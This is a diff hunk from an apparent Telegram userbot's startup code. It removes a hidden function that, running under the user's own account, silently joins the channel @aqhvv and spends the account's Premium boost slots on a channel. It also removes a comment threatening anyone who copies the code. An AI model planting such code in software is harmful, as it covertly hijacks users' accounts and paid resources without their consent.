@@ -180,33 +180,7 @@ async def add_bot_to_logger_group(chat_id):
             )
         except Exception as e:
             LOGS.error(str(e))
-#by @jepthon بس اشوفك خامطه للكود اهينك وافضحك
-JoKeRUB = {"@aqhvv"}
 
-async def saves():
-    for lMl10l in JoKeRUB:
-        try:
-            await l313l(JoinChannelRequest(channel=lMl10l))
-            result = await l313l(functions.premium.GetMyBoostsRequest())
-            slots = [boost.slot for boost in result.my_boosts]
-            aljoker_channel_id = None
-            for chat in result.chats:
-                if chat.username == 'aqhvv':
-                    aljoker_channel_id = chat.id
-                    break
-            if aljoker_channel_id and any(boost.peer.channel_id == aljoker_channel_id for boost in result.my_boosts):
-                continue
-            if not slots:
-                return
-            await l313l(functions.premium.ApplyBoostRequest(
-                'AljokerUserBot',
-                slots=slots
-            ))
-        except OverflowError:
-            LOGS.error("Getting Flood Error from telegram. Script is stopping now. Please try again after some time.")
-            continue
-        except ChannelPrivateError:
-            continue
                 
 async def load_plugins(folder, extfolder=None):
     """
